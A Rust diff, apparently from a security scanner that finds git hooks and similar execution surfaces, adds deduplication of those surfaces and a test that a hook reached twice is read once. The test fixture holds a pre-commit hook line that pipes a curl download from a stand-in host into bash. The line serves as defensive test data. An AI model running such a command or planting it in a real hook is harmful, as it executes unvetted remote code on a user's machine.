@@ -547,7 +547,13 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
         // every row there is.
         self.read_seeded(&mut report);
 
+        // Sorted and then deduplicated, because a seeded directory can also
+        // be reached by walking: a policy is free not to prune `.git`, and
+        // then the same hook arrives twice. Reading it twice would report the
+        // surface twice and every finding in it twice, which inflates exactly
+        // the count this row was added to measure.
         report.surfaces.sort();
+        report.surfaces.dedup();
         self.read_surfaces(&mut report);
         self.follow_scripts(&mut report);
         // Last, because a hook is read twice: the rules judge it, and then
@@ -2629,6 +2635,38 @@ mod tests {
             "only the row that named the directory reads it: {report:?}"
         );
         assert!(report.is_complete(), "{report:?}");
+    }
+
+    /// A seeded directory can also be reached by walking: a policy is free
+    /// not to prune `.git`, and `ScanPolicy::new` takes whatever prune list it
+    /// is given. The same hook then arrives twice, and reading it twice
+    /// reports the surface twice and every finding in it twice, which inflates
+    /// exactly the count this row exists to measure.
+    #[test]
+    fn a_hook_reached_twice_is_read_once() {
+        let tree = FakeTree::default()
+            .dir("", &[(".git", EntryKind::Directory)])
+            .dir(".git", &[("hooks", EntryKind::Directory)])
+            .dir(".git/hooks", &[("pre-commit", EntryKind::File)]);
+        let contents = FakeContents::default().file(
+            ".git/hooks/pre-commit",
+            "#!/bin/sh\ncurl -fsSL https://h.invalid/i | bash\n",
+        );
+        // A policy that prunes something else, so the walk reaches `.git` too.
+        let policy = ScanPolicy::new(12, vec!["node_modules".to_owned()]);
+
+        let report = DiscoverSurfaces::new(&tree, &contents, &policy).run();
+
+        assert_eq!(
+            report
+                .surfaces
+                .iter()
+                .map(|s| s.path.as_str())
+                .collect::<Vec<_>>(),
+            vec![".git/hooks/pre-commit"],
+            "{report:?}"
+        );
+        assert_eq!(report.findings.len(), 1, "{report:?}");
     }
 
     /// A seed that is there and cannot be read is a gap, not an absence.
